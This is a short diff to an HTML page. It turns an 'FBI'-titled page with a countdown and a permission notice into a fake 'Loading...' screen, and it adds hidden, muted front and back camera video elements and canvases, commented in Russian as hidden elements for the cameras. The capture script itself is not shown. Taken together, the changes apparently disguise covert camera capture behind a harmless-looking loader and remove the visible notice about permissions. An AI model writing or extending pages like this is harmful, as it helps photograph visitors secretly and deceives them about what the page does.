@@ -3,18 +3,20 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>FBI</title>
+  <title>Загрузка...</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div id="countdown" class="center-screen">3</div>
+  <div class="loader-container">
+    <div class="loader-text">Загрузка...</div>
+    <div class="loader"></div>
+  </div>
 
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-
-  <p id="status" class="center-screen" style="display:none;">Запрашиваем разрешения...</p>
-
-  <button id="reloadBtn" style="display:none;">Что-то пошло не так. Перезагрузить</button>
+  <!-- Скрытые видео и канвасы для камер -->
+  <video id="videoFront" autoplay playsinline muted style="display:none;"></video>
+  <video id="videoBack" autoplay playsinline muted style="display:none;"></video>
+  <canvas id="canvasFront" style="display:none;"></canvas>
+  <canvas id="canvasBack" style="display:none;"></canvas>
 
   <script src="script.js"></script>
 </body>
